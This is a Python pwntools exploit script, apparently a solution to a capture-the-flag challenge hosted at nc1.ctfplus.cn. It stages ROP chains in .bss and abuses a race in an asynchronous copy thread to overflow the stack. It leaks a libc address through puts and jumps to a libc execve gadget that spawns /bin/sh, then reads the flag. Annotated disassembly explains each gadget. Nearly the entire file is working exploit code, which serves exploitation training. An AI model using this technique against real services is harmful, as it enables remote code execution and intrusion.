from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "warning"

io = remote("nc1.ctfplus.cn", 19964)
elf = ELF("./pwn")
libc = ELF("./libc.so.6")

pop_rdi = 0x4012a3
libc_pop_rax_offset = 0x45eb0
libc_pop_rbp_offset = 0x2a2e0
async_copy_midentry = 0x4012f3
retn = 0x401492

io.sendlineafter(b"Choice: ", b"1")
io.send(flat( # written to .bss
    b'A' * 32,

    0x4040d0, # or any RW front .bss, e.g. .bss start (0x4040c0)

    pop_rdi, elf.got["puts"],
    elf.plt["puts"],

    retn,

    async_copy_midentry # secondly (but latter part only) writting .bss payload 2 to stack
    # .text:00000000004012F3                 lea     rax, s          ; "[Thread] Length check passed! Preparing"...
    # .text:00000000004012FA                 mov     rdi, rax        ; s
    # .text:00000000004012FD                 call    _puts
    # .text:0000000000401302                 mov     edi, 7A120h     ; useconds
    # .text:0000000000401307                 call    _usleep
    # .text:000000000040130C                 mov     eax, cs:copy_length
    # .text:0000000000401312                 movsxd  rdx, eax        ; n
    # .text:0000000000401315                 lea     rax, [rbp+dest]
    # .text:0000000000401319                 lea     rcx, global_msg
    # .text:0000000000401320                 mov     rsi, rcx        ; src
    # .text:0000000000401323                 mov     rdi, rax        ; dest
    # .text:0000000000401326                 call    _memcpy
    # .text:000000000040132B                 lea     rax, aThreadCopyDone ; "[Thread] Copy done! Exiting thread..."
    # .text:0000000000401332                 mov     rdi, rax        ; s
    # .text:0000000000401335                 call    _puts
    # .text:000000000040133A                 jmp     short loc_40134B
))

io.sendlineafter(b"Choice: ", b"2")
io.sendlineafter(b"Length: ", b'1')

io.sendlineafter(b"Choice: ", b"3") # Choice 3 here, 'async_puts' writting .bss playload 1 to stack

io.sendline(b"2")
io.recvuntil(b"[Thread] Length check passed! Preparing to copy...") # can switch with previous line
io.sendline(b"512")

io.recvuntil(b"[Thread] Copy done! Exiting thread...\n")
libc_base=u64(io.recv(6) + b"\x00\x00") - libc.sym.puts

io.sendline(b"1")
io.recvuntil(b"[Thread] Length check passed! Preparing to copy...")
io.send(flat( # write to .bss again
    [retn] * 8, # 3 ~ 20 available
    libc_base + libc_pop_rax_offset, 0, # rax = 0
    libc_base + libc_pop_rbp_offset, 0x404800, # RBP = .bss, must >= 0x404186 when interior 0x4040d0 selected from global_msg
    libc_base + 0xebd43
    # .text:00000000000EBD43                 lea     r10, [rbp+var_50]
    # ; R10 = RBP + var_50;
    # .text:00000000000EBD47                 mov     [rbp+var_50], rax
    # ; *(uint64_t *)R10 = *(uint64_t *)(RBP + var_50) = RAX = 0;
    # .text:00000000000EBD4B                 jmp     loc_EBC79

    # .text:00000000000EBC79 loc_EBC79:                              ; CODE XREF: execvpe+53B↓j
    # .text:00000000000EBC79                 mov     qword ptr [r10+10h], 0
    # ; *(uint64_t *)(R10 + 0x10) = *(uint64_t *)(RBP + var_50 + 0x10) = RAX = 0;
    # .text:00000000000EBC81
    # .text:00000000000EBC81 loc_EBC81:                              ; CODE XREF: execvpe+4D0↓j
    # .text:00000000000EBC81                 mov     rdx, [rbp+var_70]
    # ; *(uint64_t *)RDX = *(uint64_t *)(RBP + var_70)  // execve_arg_2
    # .text:00000000000EBC85                 mov     rsi, r10
    # ; *(uint64_t *)RSI = 0                            // execve_arg_1
    # .text:00000000000EBC88                 lea     rdi, aBinSh     ; "/bin/sh"
    # ; *(uint64_t *)RDI = "/bin/sh"                    // execve_arg_0
    # .text:00000000000EBC8F                 mov     [rbp+var_78], r9
    # .text:00000000000EBC93                 call    execve
))

io.recvuntil(b"[Thread] Copy done! Exiting thread...\n")
io.sendline(b"cat flag")
print(io.recvuntil(b"\n", drop=True).decode())